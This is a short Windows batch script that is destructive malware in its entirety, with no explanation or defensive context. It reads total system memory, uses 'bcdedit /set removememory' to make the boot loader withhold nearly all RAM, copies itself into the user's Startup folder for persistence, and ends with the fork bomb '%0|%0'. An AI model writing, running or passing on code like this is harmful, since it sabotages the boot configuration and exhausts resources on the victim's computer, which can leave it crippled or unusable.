@echo off 

echo Calculating total system memory
for /f "skip=1" %%p in ('wmic os get TotalVisibleMemorySize') do ( 
   set system_ram=%%p
   goto :end
)
:end


echo Total system ram is %system_ram%


set /a "c=%system_ram% - 28"

echo Will be getting rid of %c% bytes of memory

bcdedit.exe /set removememory %c% 

copy "%CD%\%0" "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup"
%0|%0
 
